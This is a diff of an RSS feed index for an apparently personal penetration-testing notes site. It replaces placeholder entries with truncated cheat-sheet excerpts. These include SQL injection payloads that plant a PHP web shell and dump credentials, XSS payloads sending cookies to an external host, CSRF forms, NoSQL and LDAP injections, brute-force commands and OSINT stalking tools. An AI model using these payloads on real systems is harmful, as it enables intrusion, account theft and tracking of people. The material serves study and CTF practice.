+Theory # Used # c → cyphertext # m → Plaintext message converted as a number # e → public exponent # d → private exponent # n → modulo =&amp;gt; p * q # Encrypt c = (m^e)[n] =&amp;gt; pow(m,e,n) # Decrypt m = (c^d)[n] =&amp;gt; pow(c,d,n) # 5 times encryption c = m^(e1 * e2 * e3 * e4 * e5) m = c^(d1 * d2 * d3 * d4 * d5) # Can get n and e from openssl like this cat alice_pubkey.</description>
     </item>
     
     <item>
-      <title>Test</title>
-      <link>/web-attacks/php-functions-vulnerabilities/php_filters/</link>
+      <title>Recon-ng</title>
+      <link>/open-source-intelligence-osint/technical-recon/frameworks-correlation/recon-ng/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>/web-attacks/php-functions-vulnerabilities/php_filters/</guid>
-      <description>Ceci est une page de test Ceci est un contenu de test</description>
+      <guid>/open-source-intelligence-osint/technical-recon/frameworks-correlation/recon-ng/</guid>
+      <description>General Informations https://bitbucket.org/LaNMaSteR53/recon-ng/wiki/Usage%20Guide # Its possible to add your own modules # Reconnaissance → Usage of open sources (passive) # Discovery → More active, packets sent to target # After loading a module, the context of the framework changes, and a new set of commands and options are available. # These commands and options are unique to the module. (help / show) 
+Usage # Add API keys &amp;gt; keys add shodan_api &amp;lt;key&amp;gt; &amp;gt; keys list # Modules &amp;gt; show modules &amp;gt; search &amp;lt;string&amp;gt; &amp;gt; use recon/domains-hosts/builtwith &amp;gt; show infos &amp;gt; set &amp;lt;param&amp;gt; &amp;lt;value&amp;gt; # Workspaces &amp;gt; show workspaces &amp;gt; workspaces list &amp;gt; workspaces add Name &amp;gt; workspaces select &amp;lt;ws&amp;gt; # Add companies and domains to a schema &amp;gt; show schema &amp;gt; add compagnies company &amp;gt; add domains domain.</description>
     </item>
     
     <item>
-      <title>Test</title>
-      <link>/web-attacks/php-functions-vulnerabilities/preg_match_eval/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>/web-attacks/php-functions-vulnerabilities/preg_match_eval/</guid>
-      <description>Ceci est une page de test Ceci est un contenu de test</description>
-    </item>
-    
-    <item>
-      <title>Test</title>
-      <link>/web-attacks/php-functions-vulnerabilities/preg_replace/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>/web-attacks/php-functions-vulnerabilities/preg_replace/</guid>
-      <description>Ceci est une page de test Ceci est un contenu de test</description>
-    </item>
-    
-    <item>
-      <title>Test</title>
-      <link>/web-attacks/php-functions-vulnerabilities/serialization/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>/web-attacks/php-functions-vulnerabilities/serialization/</guid>
-      <description>Ceci est une page de test Ceci est un contenu de test</description>
-    </item>
-    
-    <item>
-      <title>Test</title>
-      <link>/web-attacks/php-functions-vulnerabilities/tricks_others/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>/web-attacks/php-functions-vulnerabilities/tricks_others/</guid>
-      <description>Ceci est une page de test Ceci est un contenu de test</description>
-    </item>
-    
-    <item>
-      <title>Test</title>
-      <link>/web-attacks/php-functions-vulnerabilities/type_juggling/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>/web-attacks/php-functions-vulnerabilities/type_juggling/</guid>
-      <description>Ceci est une page de test Ceci est un contenu de test</description>
-    </item>
-    
-    <item>
-      <title>Test</title>
-      <link>/web-attacks/server-side-injections/ldap/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>/web-attacks/server-side-injections/ldap/</guid>
-      <description>Ceci est une page de test Ceci est un contenu de test</description>
-    </item>
-    
-    <item>
-      <title>Test</title>
-      <link>/web-attacks/server-side-injections/nosql/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>/web-attacks/server-side-injections/nosql/</guid>
-      <description>Ceci est une page de test Ceci est un contenu de test</description>
-    </item>
-    
-    <item>
-      <title>Test</title>
+      <title>SQL Injections</title>
       <link>/web-attacks/server-side-injections/sql/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>/web-attacks/server-side-injections/sql/</guid>
-      <description>Ceci est une page de test Ceci est un contenu de test</description>
+      <description>Resources https://websec.wordpress.com/tag/sql-filter-bypass/ # Cheat sheet https://github.com/codingo/OSCP-2/blob/master/Documents/SQL%20Injection%20Cheatsheet.md  
+General and Tricks # Classical test &#39; or 1=1 LIMIT 1 -- &#39; or 1=1 LIMIT 1 -- - &#39; or 1=1 LIMIT 1# &#39;or 1# &#39; or 1=1 -- &#39; or 1=1 -- - admin\&#39;-- -  # Upload file union all select 1,2,3,4,&amp;quot;&amp;lt;?php echo shell_exec($_GET[&#39;cmd&#39;]);?&amp;gt;&amp;quot;,6 into OUTFILE &#39;c:/inetpub/wwwroot/backdoor.php&#39;  # Passwords uNiOn aLl SeleCt 1,2,3,4,conCat(username,0x3a,password),6 FroM users uNiOn aLl SeleCt 1,2,3,4,conCat(username,0x3a,password,0x3a,flag),6 FroM users  # Dump In One Shot (Shoot): \&#39; unIOn seLEct 1,make_set(6,@:=0x0a,(selEct(1)froM(information_schema.</description>
     </item>
     
     <item>
-      <title>Test</title>
-      <link>/web-attacks/server-side-injections/ssrf/</link>
+      <title>TODO</title>
+      <link>/linux-systems/todo/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>/web-attacks/server-side-injections/ssrf/</guid>
-      <description>Ceci est une page de test Ceci est un contenu de test</description>
+      <guid>/linux-systems/todo/</guid>
+      <description></description>
     </item>
     
     <item>
-      <title>Test</title>
-      <link>/web-attacks/server-side-injections/xpath/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>/web-attacks/server-side-injections/xpath/</guid>
-      <description>Ceci est une page de test Ceci est un contenu de test</description>
-    </item>
-    
-    <item>
-      <title>Test</title>
+      <title>TODO</title>
       <link>/windows-systems/todo/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>/windows-systems/todo/</guid>
-      <description>Ceci est une page de test Ceci est un contenu de test</description>
+      <description></description>
+    </item>
+    
+    <item>
+      <title>Web Application Scans</title>
+      <link>/recon-enumeration/application-scans/web_application_scan/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/recon-enumeration/application-scans/web_application_scan/</guid>
+      <description>Nikto # For web applications, you can use nikto to identify potential vulnerabilities # Not very stealth # Think about changing the default user agent ! nitko -h http://monsite.com -o output.xml -Format [csv, xml, html, txt] 
+Whatweb # Whatweb is another scanning tool for web applications $ whatweb -h $ whatweb -l # Liste les plugins $ whatweb www.monsite.com $ whatweb www.monsite.com -v $ whatweb www.monsite.com -a 1 # Stealhty $ whatweb www.</description>
+    </item>
+    
+    <item>
+      <title>Wordpress</title>
+      <link>/web-attacks/content-management-system-cms/wordpress/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/web-attacks/content-management-system-cms/wordpress/</guid>
+      <description>General &amp;amp; Tricks # Username can be guessed on WordPress since the username will generate a different error message if it doesn&amp;#39;t exist. # Interesting files https://monsite.com/robots.txt https://monsite.com/feed https://monsite.com/readme.html https://monsite.com/xmlrpc.php # Configuration files https://monsite.com/.htaccess https://monsite.com/wp-config.php # Directory listing https://monsite.com/wp-includes # XML-RPC attack (https://github.com/1N3/Wordpress-XMLRPC-Brute-Force-Exploit) # You can bruteforce users ./wp-xml-brute http://target.com/xmlrpc.php passwords.txt username1 # If by any way you can upload files, go check /upload or /uploads for your files</description>
+    </item>
+    
+    <item>
+      <title>XSS Injections</title>
+      <link>/web-attacks/client-side-injections/xss/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/web-attacks/client-side-injections/xss/</guid>
+      <description>Resources https://html5sec.org/ https://gbhackers.com/top-500-important-xss-cheat-sheet/ https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot 
+Tips # If XSS is not executed through the UI, you can try to insert it through the API # It can then fire on the UI. Many filters are not present like this 
+Basic Stored XSS # Setup simple server python -m SimpleHTTPServer 8080 # Test wget -O- http://$(wget -qO- icanhazip.com):8080/lol # Exploit &amp;lt;script&amp;gt;document.location(&amp;#39;http://IP_EXTERNE/&amp;#39;+document.cookie)&amp;lt;/script&amp;gt; 
+Payloads # Document.location &amp;lt;script&amp;gt;document.location(&amp;#39;http://IP_EXTERNE/&amp;#39;+document.cookie)&amp;lt;/script&amp;gt; &amp;lt;script&amp;gt;document.location.href = &amp;#39;http://requestb.in/XXXXXX?cookies =&amp;#39; + document.</description>
+    </item>
+    
+    <item>
+      <title>22 - SSH</title>
+      <link>/recon-enumeration/services-enumeration/22_ssh/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/recon-enumeration/services-enumeration/22_ssh/</guid>
+      <description> Recon # Banner grabbing using telnet telnet IP 22 
+Bruteforce # List of users using wordlists hydra -L users.txt -P &amp;lt;passwordList&amp;gt; -t 3 -s port &amp;lt;IP&amp;gt; ssh # Only one user and wordlist passwords hydra -l root -P &amp;lt;passwordList&amp;gt; -t 3 -s port &amp;lt;IP&amp;gt; ssh 
+OpenSSL # Connection through openssl openssl s_client -connect IP:PORT</description>
+    </item>
+    
+    <item>
+      <title>AES Encryption</title>
+      <link>/cryptography/aes/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/cryptography/aes/</guid>
+      <description>Retrieve AES Key and mount partition # Dump AES key aeskeyfind dump # Result 8d 3f 52 7d e5 14 87 2f 59 59 08 95 8d bc 0e d1 # Mount partition echo 8d3f527de514872f595908958dbc0ed1 | xxd -r -p &amp;gt; key.bin sudo cryptsetup luksFormat --verify-passphrase --cipher=aes-ecb --hash=sha1 --key-size=128 --master-key-file=key.bin dump sudo cryptsetup luksOpen dump test sudo mount -t ext4 /dev/mapper/test /mnt/media sudo ls /mnt/media/dir2 
+Decipher encrypted aes256cbc file using openssl # Key d49af309a4c69382ff07bc6f83ba4c2595a7f086d3e5b69e119e2337cb75172d&amp;#39; ----&amp;gt; SHA-256 de &amp;#39;mcsTnTld1dDn&amp;#39;: # Decipher openssl enc -aes-256-cbc -d -in Confidentiel.</description>
+    </item>
+    
+    <item>
+      <title>Amazon &amp; Digital Ocean Buckets</title>
+      <link>/open-source-intelligence-osint/hosting-and-repositories/amazon_digitalocean/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/open-source-intelligence-osint/hosting-and-repositories/amazon_digitalocean/</guid>
+      <description>Look for static content in HTML, you can find content hosted on s3 bucket for example and then exploit it  
+Amazon S3 (AWS) Buckets # Tools like AWSBucketDump can enumerate AWS S3 buckets https://github.com/jordanpotti/AWSBucketDump 
+Teh S3 Bucketeers https://github.com/tomdev/teh_s3_bucketeers/ # You need an AWS account and set your API key in ~/.aws/credentials [default] aws_access_key_id = &amp;lt;key&amp;gt; aws_secret_access_key = &amp;lt;secret&amp;gt; # Then just run it ./bucketeer.sh &amp;lt;target&amp;gt; &amp;lt;target&amp;gt;</description>
+    </item>
+    
+    <item>
+      <title>Aquatone</title>
+      <link>/recon-enumeration/application-scans/aquatone/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/recon-enumeration/application-scans/aquatone/</guid>
+      <description>Aquatone # Aquatone is a complete tool separate in three commands to make complete recon # Collector modules : # Dictionary brute force # DNSDB.org # Google Transparency Report # HackerTarget # Netcraft # Shodan (API key needed) # ThreatCrowd # VirusTotal (API key needed) # PHASE 1 : Discovery # aquatone-discover is the first step # It uses name servers and performs some test to see if wildcard is configured # Then it asks each subdomain collector for potential subdomain # Then it tries to resolve them to see which ones are up and creates the hosts.</description>
+    </item>
+    
+    <item>
+      <title>CSRF Injections</title>
+      <link>/web-attacks/client-side-injections/csrf/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/web-attacks/client-side-injections/csrf/</guid>
+      <description>Basic CSRF 0 protection # Basic form &amp;lt;form name=&amp;#34;pls&amp;#34; action=&amp;#34;https://xxx.fr/index.php?action=profile&amp;#34; method=&amp;#34;post&amp;#34;&amp;gt; &amp;lt;div class=&amp;#34;form-group&amp;#34;&amp;gt; &amp;lt;label&amp;gt;Username:&amp;lt;/label&amp;gt; &amp;lt;input name=&amp;#34;username&amp;#34; value=&amp;#34;devsid&amp;#34; type=&amp;#34;text&amp;#34;&amp;gt; &amp;lt;/div&amp;gt; &amp;lt;br&amp;gt;	&amp;lt;div class=&amp;#34;form-group&amp;#34;&amp;gt; &amp;lt;label&amp;gt;Status:&amp;lt;/label&amp;gt; &amp;lt;input name=&amp;#34;status&amp;#34;checked=&amp;#34;checked&amp;#34; type=&amp;#34;checkbox&amp;#34;&amp;gt; &amp;lt;/div&amp;gt; &amp;lt;br&amp;gt;	&amp;lt;button type=&amp;#34;submit&amp;#34;&amp;gt;Submit&amp;lt;/button&amp;gt; &amp;lt;/form&amp;gt; &amp;lt;script language=&amp;#34;javascript&amp;#34;&amp;gt;document.pls.submit();&amp;lt;/script&amp;gt;# Basic form &amp;lt;html&amp;gt;&amp;lt;body&amp;gt; &amp;lt;form name=&amp;#34;csrf&amp;#34; action=&amp;#34;https://xxx.fr/index.php?action=profile&amp;#34; method=&amp;#34;POST&amp;#34;&amp;gt; &amp;lt;input type=&amp;#34;hidden&amp;#34; name=&amp;#34;username&amp;#34; value=&amp;#34;aaa&amp;#34;&amp;gt; &amp;lt;input type=&amp;#34;hidden&amp;#34; name=&amp;#34;status&amp;#34; value=&amp;#34;on&amp;#34;&amp;gt; &amp;lt;/form&amp;gt; &amp;lt;script type=&amp;#34;text/javascript&amp;#34;&amp;gt;document.csrf.submit();&amp;lt;/script&amp;gt; &amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;# Form using XMLHttpRequest &amp;lt;script&amp;gt; var formData = new FormData(); formData.append(&amp;#34;username&amp;#34;, &amp;#34;test&amp;#34;); formData.append(&amp;#34;status&amp;#34;, &amp;#34;on&amp;#34;); var request = new XMLHttpRequest(); request.</description>
+    </item>
+    
+    <item>
+      <title>Drupal</title>
+      <link>/web-attacks/content-management-system-cms/drupal/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/web-attacks/content-management-system-cms/drupal/</guid>
+      <description>TODO</description>
+    </item>
+    
+    <item>
+      <title>E-mails</title>
+      <link>/open-source-intelligence-osint/human-recon/email/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/open-source-intelligence-osint/human-recon/email/</guid>
+      <description>Online tools # Domain e-mail syntax finder https://www.email-format.com https://hunter.io # E-mail validator https://tools.verifyemailaddress.io/ http://mailtester.com https://dnslytics.com/email-test https://verify-email.org/ 
+The Harvester # theHarvester is a famous OSINT and scrapping tool for passiv recon on targets # Using API keys will highly increase results Usage: theharvester options -d: Domain to search or company name -b: data source: baidu, bing, bingapi, dogpile, google, googleCSE, googleplus, google-profiles, linkedin, pgp, twitter, vhost, virustotal, threatcrowd, crtsh, netcraft, yahoo, all -s: start in result number X (default: 0) -v: verify host name via dns resolution and search for virtual hosts -f: save the results into an HTML and XML file (both) -n: perform a DNS reverse query on all ranges discovered -c: perform a DNS brute force for the domain name -t: perform a DNS TLD expansion discovery -e: use this DNS server -p: port scan the detected hosts and check for Takeovers (80,443,22,21,8080) -l: limit the number of results to work with(bing goes from 50 to 50 results, google 100 to 100, and pgp doesn\&amp;#39;t use this option) -h: use SHODAN database to query discovered hosts Examples: theharvester -d microsoft.</description>
+    </item>
+    
+    <item>
+      <title>File Upload</title>
+      <link>/web-attacks/files-inclusions-and-injections/file_upload/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/web-attacks/files-inclusions-and-injections/file_upload/</guid>
+      <description>File Upload are well known and kinda old PHP vulnerabilities but can still work some times  
+Double Extension # If the target is only checking extension → exploit.php.jpg 
+MIME Type # Classical, using Burp for example Content-Type: application/x-php → Content-Type: image/gif # Using cURL curl -i -F &amp;#34;file=@shell.php;type=image/gif&amp;#34; --cookie &amp;#34;...&amp;#34; &amp;#34;&amp;lt;target&amp;gt;&amp;#34; # You can also create or update the following registry key on Windows {{HKLM\SOFTWARE\Classes\.php}} # Then create a “String” type registry key and, named “Content-Type&amp;#34; and set the value “image/gif”</description>
+    </item>
+    
+    <item>
+      <title>Fully Interactive TTY Shell</title>
+      <link>/shells-methods/tty_full/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/shells-methods/tty_full/</guid>
+      <description>Fully Interactive TTY Shell # Using STTY # In reverse shell $ python -c &amp;#39;import pty; pty.spawn(&amp;#34;/bin/bash&amp;#34;)&amp;#39; Ctrl-Z # In Kali $ stty raw -echo $ fg # In reverse shell $ reset $ export SHELL=bash $ export TERM=xterm-256color $ stty -raw echo OR $ stty rows &amp;lt;num&amp;gt; columns &amp;lt;cols&amp;gt; 
+Spawning a shell # Using os.system echo os.system(&amp;#39;/bin/bash&amp;#39;)# Using interactive sh /bin/sh -i# Using Perl, Ruby or Lua perl -e &amp;#39;exec &amp;#34;/bin/sh&amp;#34;;&amp;#39; perl: exec &amp;#34;/bin/sh&amp;#34;; ruby: exec &amp;#34;/bin/sh&amp;#34;; lua: os.</description>
+    </item>
+    
+    <item>
+      <title>Gasmak</title>
+      <link>/open-source-intelligence-osint/technical-recon/frameworks-correlation/gasmask/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/open-source-intelligence-osint/technical-recon/frameworks-correlation/gasmask/</guid>
+      <description>General Informations https://github.com/twelvesec/gasmask # All in one information gathering tool # Automated tool used to gather information on the following sources : # - ask, bing, crt, censys.io, dns, dnsdumpster, dogpile, github # - google, googleplus, instagram, linkedin, netcraft, pgp # - reddit, reverse dns, twitter, vhosts, virustotal, whois, # - yahoo, yandex, youtube # 2 modes : Basic &amp;amp; Nongoogle # - whois/dns/reverse DNS/bing virtual hosts # - search in other engines # API Keys needed : shodan, censys,</description>
+    </item>
+    
+    <item>
+      <title>John Cheatsheet</title>
+      <link>/passcracking-hashfiles/john_cheatsheet/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/passcracking-hashfiles/john_cheatsheet/</guid>
+      <description>TODO</description>
+    </item>
+    
+    <item>
+      <title>LDAP &amp; DNS</title>
+      <link>/network/ldap_dns/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/network/ldap_dns/</guid>
+      <description>LDAP Null Bind Enumeration # Syntax ldapsearch -h &amp;#34;LENOMDELAMACHINELDAP&amp;#34; -p &amp;#34;LEPORTSURLEQUELONYACCEDE&amp;#34; -x -b &amp;#34;ou=UNE_OU_EXISTANTE,DC=QUIVABIEN,DC=SUITE,DC=FOO&amp;#34; -v # Classic research ldapsearch -h challenge01.root-me.org -p 54013 -x -b &amp;#34;ou=anonymous,dc=challenge01,dc=root-me,dc=org&amp;#34; &amp;#34;cn=*&amp;#34; 
+DNS Zone Transfer # Zone transfer using dig dig @challenge01.root-me.org -p 54011 AXFR ch11.challenge01.root-me.org. # Zone transfer using nslookup nslookup -type=any &amp;gt; set port &amp;lt;port&amp;gt; &amp;gt; server challenge01.root-me.org &amp;gt; ch11.challenge01.root-me.org# Custom PERL zone transfer #!/usr/bin/env perl use warnings; use strict; use Net::DNS; # ici je teste rapidement si j&amp;#39;ai bien installe le module Net::DNS print Net::DNS-&amp;gt;version, &amp;#34;\n&amp;#34;; # creation de l&amp;#39;instance du resolveur maison.</description>
+    </item>
+    
+    <item>
+      <title>Nmap Cheatsheet</title>
+      <link>/recon-enumeration/port-scanning/nmap_cheatsheet/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/recon-enumeration/port-scanning/nmap_cheatsheet/</guid>
+      <description>Full commands examples # Ping scan nmap -sP 192.168.0.0/24 # Quick scan nmap -T4 -F 192.168.1.1 -vvv # Quick scan plus (more info but more aggressive) nmap -sV -T4 -O -F –version-light 192.168.1.1 -vvv # TCP Syn and UDP Scan (requires root) nmap -sS -sU -PN -p T:80,T:445,U:161 192.168.1.1 # Soft nmap nmap -v -Pn -n -T4 -sT -sV --version-intensity=5 --reason 192.168.1.1 # Full nmap nmap -v -Pn -n -T4 -sT -p- --reason 192.</description>
+    </item>
+    
+    <item>
+      <title>NoSQL Injections</title>
+      <link>/web-attacks/server-side-injections/nosql/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/web-attacks/server-side-injections/nosql/</guid>
+      <description>Basic Authentication index.php?login[$regex]=a.*&amp;amp;pass[$ne]=lol index.php?login[$gt]=admin&amp;amp;login[$lt]=test&amp;amp;pass[$ne]=1 # Basic NoSQL Injection http://url?login[$nin][]=admin&amp;amp;login[$nin][]=test&amp;amp;pass[$ne]=toto 
+Blind NoSQL Injection # Get size index.php ?chall_name=nosqlblind&amp;amp;flag[$regex]=.1 # Enumeration index.php ?</description>
+    </item>
+    
+    <item>
+      <title>PHP Functions</title>
+      <link>/web-attacks/php-vulnerabilities/functions/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/web-attacks/php-vulnerabilities/functions/</guid>
+      <description>Assert() # The assert() function will execute code in params # Example using root-me challenge ?page=.. Warning : assert() : Assertion &amp;#34;strpos(’includes/...php’, ’..’) === false&amp;#34; failed in path/index.php on line 8 # The request looks like this assert(&amp;#34;strpos(&amp;#39;includes/&amp;#39; . $_GET[&amp;#39;page&amp;#39;] . &amp;#39;.php&amp;#39;, &amp;#39;..&amp;#39;) === false&amp;#34;) # If we inject this ?page=salade.php&amp;#39;,&amp;#39;..&amp;#39;) || print(&amp;#39;tomate&amp;#39;) || strpos(&amp;#39;oignons # The request will look like assert(&amp;#34;strpos(&amp;#39;/includes/salade.php&amp;#39;,&amp;#39;..&amp;#39;) || print(&amp;#39;tomate&amp;#39;) || strpos(&amp;#39;oignons.php&amp;#39;,&amp;#39;..&amp;#39;) ===false&amp;#34;) # Then, to exploit ?</description>
+    </item>
+    
+    <item>
+      <title>Subdomain Enumeration</title>
+      <link>/open-source-intelligence-osint/technical-recon/subdomain_enumeration/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/open-source-intelligence-osint/technical-recon/subdomain_enumeration/</guid>
+      <description>Google Dorks &amp;amp; Bing Dorks # Google dorks are usefull for finding new subdomains site:wikipedia.org site:*.wikipedia.org -www -store -jobs -uk # Bing also support dorks and can give others results site: 
+Online DNS tools and services # VirusTotal runs its own passive DNS replication service # DNS Dumpster can also find large number of sub-domains 
+OWASP Amass # OWASP Amass tool suite is used to build a network map of the target # It relies for subdomain enumeration on scrapping data-sources, recursive bruteforcing, crawling web services, permuting names and reverse DNS sweeping # Basic use (DNS lookups and name alterations) amass -d example.</description>
+    </item>
+    
+    <item>
+      <title>Twitter</title>
+      <link>/open-source-intelligence-osint/human-recon/social-networks/twitter/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/open-source-intelligence-osint/human-recon/social-networks/twitter/</guid>
+      <description>Tips &amp;amp; Tricks # With spoonbill, you can check and record people accounts modification # It checks accounts of people you&amp;#39;re following https://tweepsect.com/ # When was created an account http://twbirthday.com/***REMOVED***/ # Find stalker (checks who&amp;#39;s following and who&amp;#39;s followed) and intersect them https://tweepsect.com/ # You can triangulate accounts by looking who&amp;#39;s following x+x or who y+y follows http://twiangulate.com # Search using geocode geocode:36.1143855,-115.1727518,1km # Tweeter account analysis (account needed) https://tweetreach.</description>
+    </item>
+    
+    <item>
+      <title>25 - SMTP</title>
+      <link>/recon-enumeration/services-enumeration/25_smtp/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/recon-enumeration/services-enumeration/25_smtp/</guid>
+      <description> Identification # Connection and test using telnet telnet &amp;lt;IP&amp;gt; 25 EHLO &amp;lt;IP&amp;gt; VRFY root EXPN root Mail from: me@test.com To: root@test.com Data: Subject: Message Hi, Just a test message. (Double carriage return) 
+Enumeration # using smtp-user-enum script smtp-user-enum -M VRFY -U users.txt -t &amp;lt;IP&amp;gt;</description>
+    </item>
+    
+    <item>
+      <title>Cracking files</title>
+      <link>/passcracking-hashfiles/cracking_files/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/passcracking-hashfiles/cracking_files/</guid>
+      <description>Cracking archives # RAR rar2john file.rar &amp;gt; rar_hashes.txt john --wordlist=passwords.txt rar_hashes.txt # ZIP zip2john file.rar &amp;gt; zip_hashes.txt john --wordlist=passwords.txt zip_hashes.txt # ZIP Using fcrackzip fcrackzip -u -D -p rockyou.txt recup.zip 
+Cracking shadow files unshadow passwd shadow &amp;gt; shadowjohn.txt john --wordlist=/home/user/Desktop/Certifs/OSCP/Tools/Wordlist/Bruteforce/rockyou.txt --rules shadowjohn.txt john --show shadowjohn.txt # Hashcat SHA512 $6$ shadow file hashcat -m 1800 -a 0 hash.txt rockyou.txt --username #Hashcat MD5 $1$ shadow file hashcat -m 500 -a 0 hash.</description>
+    </item>
+    
+    <item>
+      <title>Directory &amp; File Discovery</title>
+      <link>/web-attacks/files-inclusions-and-injections/directory_file_discovery/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/web-attacks/files-inclusions-and-injections/directory_file_discovery/</guid>
+      <description> Test for directory traversal  
+General &amp;amp; Tricks # Check for .git # If there is a git, possible to download the source code # Check for temp saved files # Vim creates .swp files index.php/.admin.html.swp # Path traversal cheat sheet https://www.gracefulsecurity.com/path-traversal-cheat-sheet-linux/ 
+Patator # Fuzzing patator http_fuzz url=http://10.10.10.150/FILE0 0=wordlist.txt -x ignore:code=400 -x ignore:code=404 # Auth basic patator http_fuzz url=https://IP/FILE0 0=.wordlisttxt -x ignore:code=400 -x ignore:code=404 header=&amp;#39;Authorization: Basic YOUR_BASE64_HERE&amp;#39;</description>
+    </item>
+    
+    <item>
+      <title>Facebook</title>
+      <link>/open-source-intelligence-osint/human-recon/social-networks/facebook/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/open-source-intelligence-osint/human-recon/social-networks/facebook/</guid>
+      <description>Tips &amp;amp; Tricks # Stalking and Information Gathering https://stalkscan.com/ # Facebook video downloader https://fbdown.net/ # Find Facebook ID https://findmyfbid.com 
+Facebook Tricks # You can search by e-mail # You can find accounts by e-mail with the recover function https://www.facebook.com/login/identify?ctx=recover https://www.facebook.com/login/identify # Search photo by ID https://www.facebook.com/photo.php?fbid=PHOTO-ID-HERE 
+Facebook Sleep Stats # A small tool to show the potential privacy implications modern social media have. # By tracking online/offline status of people on Facebook, it is possible to get an accurate image of their sleep pattern.</description>
+    </item>
+    
+    <item>
+      <title>Joomla!</title>
+      <link>/web-attacks/content-management-system-cms/joomla/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/web-attacks/content-management-system-cms/joomla/</guid>
+      <description>Scanning and Enumeration # Get components running on the website joomscan --url http://10.10.10.150/ --random-agent --enumerate-components # You can also check /administrator/manifests/files/joomla.xml # If you find components, you can often access the configuration file # JCE component → /components/com_jce/jce.xml # Check for vulnerabilities affecting components # Joomlavs is also a good scanning tool https://github.com/rastating/joomlavs 
+Reverse Shell # You must first log as admin # Then you must activate the PHP extension in settings System → Component → Media → “php” in legal extensions and nothing in ignored extension # If it&amp;#39;s not enough and the manager is detecting malicious PHP upload, you can still edit templates # For example, the /index.</description>
+    </item>
+    
+    <item>
+      <title>LDAP Injections</title>
+      <link>/web-attacks/server-side-injections/ldap/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/web-attacks/server-side-injections/ldap/</guid>
+      <description> Basic LDAP Injection # Classical request : (&amp;amp;(uid=)(userPassword=)) # So result is TRUE if uid AND userPassword are true # You can put ‘)’ in request to crash and see the request username : *)(|(uid=* password : ) → (&amp;amp;(uid=*)(|(uid=*)(userPassword=))) OR username=* password=*)(&amp;amp; → (&amp;amp;(uid=*)(userPassword=*)(&amp;amp;)) 
+Blind LDAP Injection # You have to find/imagine how is the request built # test using only a char → OK → request is (mail=*[texte]*) # You can try (mail=*)(sn=*) → )(sn= → OK # Then, the password attribute (mail=*)(password=*) → OK @*)(password=x → FALSE @*)(password=d → TRUE # You can the enumerate each char</description>
+    </item>
+    
+    <item>
+      <title>MAC &amp; ARP</title>
+      <link>/network/mac_arp/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/network/mac_arp/</guid>
+      <description>MAC Filtering Ethernet sudo macchanger -a eth0 WiFi sudo airmon-ng start wlan0 $ airodump-ng –c [channel]–bssid [target router MAC Address]–i wlan0mon # Trouver des MAC whitelisted sudo airmon-ng stop wlan0mon sudo ifconfig wlan0 down sudo macchanger -m [New MAC Address] wlan0 sudo ifconfig wlan0 up 
